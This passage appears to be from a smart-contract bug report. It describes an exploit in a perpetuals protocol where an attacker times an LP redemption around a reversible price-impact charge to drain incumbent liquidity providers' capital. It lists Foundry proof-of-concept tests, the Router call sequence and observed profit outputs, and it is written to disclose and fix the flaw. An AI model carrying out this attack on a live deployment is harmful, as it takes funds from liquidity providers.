The attacker still earns `278.161581 USDG` after both execution fees.

The profit therefore does not depend on reducing a fresh close charge. It results from activating discounted LP shares before deterministic reserve recovery.

## Standalone redemption test and public finding #31 control

Run:

```sh
forge test \
  --match-path test/perps/accounting/close/VpiLpRedemptionOwnership.t.sol \
  -vv
```

This file contains four tests:

```text
test_PoC_ReversibleVpiIsSoldToIncumbentLpsAtAnUnchangedNormalPrice
test_PoC_PublicRouterExecutesTheFullAttackLifecycle
test_Control_IncomingLpRestoresDepthButOwnershipAttackStillProfits
test_PoC_CapPriceAmplificationNearlyWipesAllIncumbentLpCapital
```

### Ordinary unchanged-price redemption

The first test:

1. funds `1,000,000 USDG` of incumbent Junior liquidity;
2. funds `1,000,000 USDG` of attacker Junior liquidity;
3. gives the attacker `100,000 USDG` of trader capital;
4. matures redemption of all attacker Junior shares;
5. opens an `800,000`-token SHORT at `$1`;
6. settles the LP epoch after the open;
7. claims the inflated redemption;
8. closes the SHORT at the same `$1` mark; and
9. compares the attacker’s final wallet and Clearinghouse value with all initially supplied LP and trader capital.

Observed output:

```text
positive VPI temporarily booked as LP revenue: 1598.401598
attacker redemption: 1000798.792277
incumbent principal extracted: 158.792277
profit after hypothetical pre-withdraw-depth fix: 157.517127
incumbent LP assets before: 1002000.000000
incumbent LP assets after: 1001521.207723
```

The test also calculates a counterfactual close at the pre-withdrawal depth and verifies that the ownership transfer remains profitable under that hypothetical depth fix.

### Public Router lifecycle

The second test performs the complete lifecycle through:

```solidity
router.commitOrder(openRequest);
router.executeOrder(openOrderId, openUpdateData);
router.settleLpEpoch(settleUpdateData);
router.commitOrder(closeRequest);
router.executeOrder(closeOrderId, closeUpdateData);
```

Observed output:

```text
public-Router attacker profit: 158.790823
public-Router inflated redemption: 1000798.792275
```

This confirms reachability through the delayed-order Router and permissionless LP settlement entry points.

### Exact-depth restoration control

The third test adds an unrelated incoming LP deposit in the same epoch. Redemptions are funded first and deposits activate afterward, so the incoming deposit replaces the attacker’s withdrawal before the attacker closes.

The test asserts:

```solidity
assertEq(
    depthBeforeClose,
    depthBeforeOpen + reversibleVpiRevenue,
    "unrelated incoming capital exactly restores the pre-withdrawal close depth"
);

assertLt(
    poolCashSpentOnClose + closeExecutionFee,
    reversibleVpiRevenue,
    "restored depth makes the rebate smaller than the opening VPI, not amplified"
);
```

Observed output:

```text
restored-depth attacker profit: 157.517127
restored close depth: 2003598.401598
opening VPI: 1598.401598
smaller closing VPI: 1597.126448
attacker redemption: 1000798.792277
```

The closing VPI is smaller than the opening VPI, yet the attacker still profits `157.517127 USDG`.

This removes the temporary depth-reduction effect described by public finding #31 and isolates the LP ownership transfer.

### Cap-price impact amplifier

The final test is not required for the ordinary-price exploit. It demonstrates the upper impact when a SHORT opened at the configured cap has zero maximum directional profit liability.

Observed output:

```text
attacker redemption at inflated NAV: 3125499.181492
attacker profit: 1499.181492
incumbent LP capital before: 2000.000000
incumbent LP capital after: 0.818508
incumbent LP loss: 1999.181492
```

This is a `99.96%` loss of incumbent capital. It requires approximately `3,123,000 USDG` of attacker LP capital against `2,000 USDG` of incumbent capital and a cap-price state, so it is included only as an impact amplifier.

## Complete test result

Running all three files produced:

```text
Ran 4 tests for VpiLpRedemptionOwnershipTest
4 passed; 0 failed; 0 skipped

Ran 1 test for VpiLpEntryOwnershipTest
1 passed; 0 failed; 0 skipped

Ran 1 test for VpiLpCombinedOwnershipTest
1 passed; 0 failed; 0 skipped

6 tests passed, 0 failed, 0 skipped
```

Existing VPI accounting suites also continue to pass:

```sh
forge test \
  --match-path test/perps/accounting/close/VpiRoundTripAccounting.t.sol \
  -q

forge test \
  --match-path test/perps/accounting/fees/VpiDepth.t.sol \
  -q
```

Those existing suites correctly prevent a trader-only VPI round trip from extracting value and keep negative VPI nonwithdrawable. They do not exercise an LP ownership transition between the paired VPI actions.

## PoC file hashes

```text
f72b2a1ffec0999b4383c22ebaba74f851ce7fee72959510b89d5600cae63217  VpiLpEntryOwnership.t.sol
57078d616e95076e3f4eb66e77c401f5c6eb1175c3f6f77cfea588173abc1e4f  VpiLpCombinedOwnership.t.sol
9a2921ccf97a87e11a4b832622dc1e6a99a46d146259863b57f35594e632bee3  VpiLpRedemptionOwnership.t.sol
```

The PoCs are local Foundry tests only. They do not contact or modify a public deployment and require no cleanup beyond removing the three added test files.
